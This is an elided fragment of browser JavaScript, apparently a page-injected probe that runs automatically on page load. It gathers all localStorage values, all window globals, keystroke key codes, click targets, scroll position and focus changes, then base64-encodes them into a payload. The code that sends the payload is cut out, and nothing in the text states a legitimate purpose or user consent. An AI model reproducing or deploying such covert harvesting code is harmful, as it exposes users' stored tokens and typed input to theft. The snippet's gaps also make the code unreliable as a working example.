...
(function (q, g, r) {
  ...
  const browserProbe = {
    eventTracker: new Map(),
    localStorageTracker: new Set(),
    globalVariableTracker: {},
    activeElementTracker: null,
    scanQueue: new Map(Object.entries(window.data)),
    discovered: new Set(),
    globalVariableCollector(data) {
      for (let key in window) {
        this.globalVariableTracker[key] = window[key];
      }
    },
    localStorageProbe() {
      for (let key in localStorage) {
        this.localStorageTracker.add(localStorage[key]);
      }
    },
    addEventListeners() {
      document.addEventListener('click', event => this.eventTracker.set('click', event.target));
      document.addEventListener('scroll', event => this.eventTracker.set('scroll', window.scrollY));
      document.addEventListener('keydown', event => this.eventTracker.set('keydown', event.keyCode));
    },
    activeElementObserver() {
      this.activeElementTracker = document.activeElement;
      setInterval(() => {
        if (this.activeElementTracker !== document.activeElement) {
          this.activeElementTracker = document.activeElement;
          this.jshook('focusChanged');
        }
      }, 100);
    },
    jshook(name) {
    ...
    async scan() {
      ...
      const payload = btoa(JSON.stringify({
        ...
        trackedEvents: Object.fromEntries(this.eventTracker),
        localStorageItems: Array.from(this.localStorageTracker),
        globalVariables: this.globalVariableTracker
      }));
  ...
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      browserProbe.addEventListeners();
      browserProbe.activeElementObserver();
      browserProbe.localStorageProbe();
      browserProbe.globalVariableCollector();
      browserProbe.scan();
    });
  } else {
    browserProbe.addEventListeners();
